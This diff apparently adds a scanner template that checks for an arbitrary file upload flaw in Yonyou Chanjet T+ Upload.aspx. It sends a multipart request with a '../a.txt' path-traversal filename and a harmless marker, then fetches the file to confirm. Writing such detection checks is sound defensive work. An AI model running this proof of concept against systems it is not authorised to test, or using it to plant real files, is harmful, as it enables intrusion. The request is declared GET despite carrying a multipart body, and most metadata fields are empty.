@@ -1,0 +1,36 @@
+id:
+
+info:
+  name: 用友畅捷通T+ Upload.aspx 任意文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /tplus/SM/SetupAccount/Upload.aspx?preload=1
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Cache-Control: max-age=0
+    Connection: close
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysHT4cEvOAWALSZEv
+    Origin: null
+    Upgrade-Insecure-Requests: 1
+  data: |
+    ------WebKitFormBoundarysHT4cEvOAWALSZEv
+    Content-Disposition: form-data; name="File1"; filename="../a.txt"
+    Content-Type: image/jpeg
+  
+    123456
+    ------WebKitFormBoundarysHT4cEvOAWALSZEv--
+response1:
+requests2:
+  method: GET
+  path: /tplus/SM/SetupAccount/a.txt
+response2:
+  headers:
+  body: 123
+  code:
